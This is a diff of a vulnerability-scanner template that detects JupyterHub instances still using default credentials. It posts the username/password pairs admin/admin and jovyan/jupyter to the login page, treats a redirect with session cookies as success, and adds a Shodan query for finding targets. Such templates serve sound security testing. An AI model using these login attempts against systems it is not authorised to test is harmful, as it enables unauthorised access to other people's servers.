@@ -1,10 +1,9 @@
 id: jupyterhub-default-login
-
 info:
-  name: Jupyterhub - Default Login
+  name: Jupyterhub - Default Admin Discovery
   author: For3stCo1d
   severity: high
-  description: Jupyterhub default login information was discovered.
+  description: Jupyterhub default admin credentials were discovered.
   reference:
     - https://github.com/jupyterhub/jupyterhub
   classification:
@@ -15,36 +14,33 @@ info:
   metadata:
     runzero-match: any(each(service["html.titles"]), {# matches "JupyterHub"})
     max-request: 2
+    product: jupyterhub
+    shodan-query: http.title:"JupyterHub"
     vendor: jupyter
-  tags: jupyterhub,default-login,vuln
-
+  tags: default-login,jupyterhub,vuln
 http:
-  - raw:
+  - attack: pitchfork
+    matchers:
+      - condition: and
+        dsl:
+          - contains(tolower(header), 'jupyterhub-session-id=')
+          - contains(tolower(header), 'jupyterhub-hub-login=')
+        type: dsl
+      - status:
+          - 302
+        type: status
+    matchers-condition: and
+    payloads:
+      pass:
+        - admin
+        - jupyter
+      user:
+        - admin
+        - jovyan
+    raw:
       - |
         POST /hub/login?next= HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         username={{user}}&password={{pass}}
-
-    attack: pitchfork
-    payloads:
-      user:
-        - admin
-        - jovyan
-      pass:
-        - admin
-        - jupyter
-
-    matchers-condition: and
-    matchers:
-      - type: dsl
-        dsl:
-          - contains(tolower(header), 'jupyterhub-session-id=')
-          - contains(tolower(header), 'jupyterhub-hub-login=')
-        condition: and
-
-      - type: status
-        status:
-          - 302
-
